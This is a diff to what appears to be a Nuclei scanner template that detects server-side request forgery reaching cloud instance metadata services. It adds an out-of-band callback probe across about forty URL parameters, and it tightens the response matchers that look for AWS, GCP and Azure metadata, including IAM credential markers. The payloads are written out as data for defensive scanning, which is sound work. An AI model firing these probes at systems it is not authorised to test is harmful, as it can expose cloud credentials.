@@ -4,12 +4,81 @@ info:
   name: SSRF To Cloud Instance Metadata Service
   author: p3i
   severity: high
-  description: Tests common URL parameters for Server-Side Request Forgery reaching cloud instance metadata services (AWS IMDSv1, GCP, Azure, DigitalOcean, Oracle Cloud). A successful hit exposes IAM credentials, instance identity, and cloud environment configuration.
+  description: Tests common URL parameters for Server-Side Request Forgery using an OOB callback first, then falls back to strict in-band cloud metadata body verification. Status-only 200 responses are ignored to avoid catchall/query-param false positives.
   tags: misconfig,ssrf,cloud,metadata,aws,gcp,azure,imds,web
   metadata:
-    max-request: 108
+    max-request: 216
 
 http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/{{ssrf_oob_path}}"
+
+    payloads:
+      ssrf_oob_path:
+        - "?url=http://{{interactsh-url}}/aws/latest/meta-data/"
+        - "?url=http://{{interactsh-url}}/aws/latest/meta-data/iam/security-credentials/"
+        - "?url=http://{{interactsh-url}}/gcp/computeMetadata/v1/?recursive=true"
+        - "?url=http://{{interactsh-url}}/azure/metadata/instance?api-version=2018-02-01"
+        - "?target=http://{{interactsh-url}}/aws/latest/meta-data/"
+        - "?target=http://{{interactsh-url}}/gcp/computeMetadata/v1/?recursive=true"
+        - "?redirect=http://{{interactsh-url}}/aws/latest/meta-data/"
+        - "?redirect=http://{{interactsh-url}}/gcp/computeMetadata/v1/?recursive=true"
+        - "?next=http://{{interactsh-url}}/aws/latest/meta-data/"
+        - "?file=http://{{interactsh-url}}/aws/latest/meta-data/"
+        - "?path=http://{{interactsh-url}}/aws/latest/meta-data/"
+        - "?src=http://{{interactsh-url}}/aws/latest/meta-data/"
+        - "?href=http://{{interactsh-url}}/aws/latest/meta-data/"
+        - "?image=http://{{interactsh-url}}/aws/latest/meta-data/"
+        - "?fetch=http://{{interactsh-url}}/aws/latest/meta-data/"
+        - "?load=http://{{interactsh-url}}/aws/latest/meta-data/"
+        - "?proxy=http://{{interactsh-url}}/aws/latest/meta-data/"
+        - "?request=http://{{interactsh-url}}/aws/latest/meta-data/"
+        - "?link=http://{{interactsh-url}}/aws/latest/meta-data/"
+        - "?callback=http://{{interactsh-url}}/aws/latest/meta-data/"
+        - "?endpoint=http://{{interactsh-url}}/aws/latest/meta-data/"
+        - "?api=http://{{interactsh-url}}/aws/latest/meta-data/"
+        - "?server=http://{{interactsh-url}}/aws/latest/meta-data/"
+        - "?host=http://{{interactsh-url}}/aws/latest/meta-data/"
+        - "?webhook=http://{{interactsh-url}}/aws/latest/meta-data/"
+        - "?import=http://{{interactsh-url}}/aws/latest/meta-data/"
+        - "?download=http://{{interactsh-url}}/aws/latest/meta-data/"
+        - "?uri=http://{{interactsh-url}}/aws/latest/meta-data/"
+        - "?resource=http://{{interactsh-url}}/aws/latest/meta-data/"
+        - "?location=http://{{interactsh-url}}/aws/latest/meta-data/"
+        - "?open=http://{{interactsh-url}}/aws/latest/meta-data/"
+        - "?data=http://{{interactsh-url}}/aws/latest/meta-data/"
+        - "?source=http://{{interactsh-url}}/aws/latest/meta-data/"
+        - "?returnUrl=http://{{interactsh-url}}/aws/latest/meta-data/"
+        - "?return_url=http://{{interactsh-url}}/aws/latest/meta-data/"
+        - "?remote=http://{{interactsh-url}}/aws/latest/meta-data/"
+        - "?site=http://{{interactsh-url}}/aws/latest/meta-data/"
+        - "?domain=http://{{interactsh-url}}/aws/latest/meta-data/"
+        - "?forward=http://{{interactsh-url}}/aws/latest/meta-data/"
+        - "?page=http://{{interactsh-url}}/aws/latest/meta-data/"
+        - "?continue=http://{{interactsh-url}}/aws/latest/meta-data/"
+        - "?destination=http://{{interactsh-url}}/aws/latest/meta-data/"
+
+    attack: batteringram
+    redirects: false
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        condition: or
+        words:
+          - "http"
+          - "dns"
+
+      - type: word
+        part: interactsh_request
+        condition: or
+        words:
+          - "/aws/latest/meta-data/"
+          - "/gcp/computeMetadata/v1/"
+          - "/azure/metadata/instance"
+
   - method: GET
     path:
       - "{{BaseURL}}/{{ssrf_path}}"
@@ -72,8 +141,7 @@ http:
         - "?destination=http://169.254.169.254/latest/meta-data/"
 
     attack: batteringram
-    redirects: true
-    max-redirects: 3
+    redirects: false
     stop-at-first-match: true
     matchers-condition: and
     matchers:
@@ -85,16 +153,26 @@ http:
         dsl:
           - >-
             (contains(body, 'ami-id') && contains(body, 'instance-id')) ||
+            (contains(body, 'ami-id') && contains(body, 'instance-type')) ||
             contains(body, 'ami-launch-index') ||
             contains(body, 'AWSAccessKeyId') ||
             (contains(body, 'AccessKeyId') && contains(body, 'SecretAccessKey')) ||
+            contains(body, 'security-credentials') ||
             contains(body, 'iam/security-credentials') ||
+            contains(body, 'iam/') ||
             contains(body, 'computeMetadata') ||
+            contains(body, 'service-accounts') ||
+            contains(body, 'serviceAccounts') ||
+            contains(body, 'project-id') ||
             (contains(body, 'serviceAccounts') && contains(body, 'numeric-project-id')) ||
+            contains(body, 'metadata/instance') ||
+            contains(body, 'api-version=2018-02-01') ||
             (contains(body, 'subscriptionId') && contains(body, 'resourceGroupName')) ||
             contains(body, 'droplet_id') ||
             contains(body, 'tenancyId')
           - "!contains(tolower(header), 'content-type: text/html')"
+          - "!contains(tolower(body), '<html')"
+          - "!contains(tolower(body), '<!doctype')"
           - "len(body) > 20"
 
     extractors:
